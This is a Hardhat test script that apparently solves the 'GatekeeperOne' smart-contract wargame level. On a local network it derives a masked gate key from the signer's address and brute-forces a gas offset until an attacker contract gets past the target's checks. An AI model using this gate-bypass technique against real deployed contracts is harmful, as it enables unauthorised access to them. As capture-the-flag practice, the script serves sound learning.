import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("GatekeeperOne", () => {
  it("attack", async () => {
    const [attacker] = await ethers.getSigners();

    const GatekeeperOneFactory = await ethers.getContractFactory("GatekeeperOne");
    const gatekeeperOne = await GatekeeperOneFactory.deploy();
    await gatekeeperOne.deployed();

    const gatekeeperOneAttackerFactory = await ethers.getContractFactory("GatekeeperOneAttacker");
    const gatekeeperOneAttacker = await gatekeeperOneAttackerFactory.deploy(gatekeeperOne.address);
    await gatekeeperOneAttacker.deployed();

    for (let i = 0; i < 8191; i++) {
      console.log(`Trying ${i}...`);
      try {
        const mask = "0xffffffff0000ffff";
        const shortAddress = "0x" + attacker.address.slice(attacker.address.length - 16, attacker.address.length);
        const gateKey = BigNumber.from(shortAddress).and(mask);

        const tx = await gatekeeperOneAttacker.enter(i, BigNumber.from(gateKey)); // 196
        await tx.wait();
        console.log(`Found value: ${i}`);
        break;
      } catch (err) {}
    }
  });
});
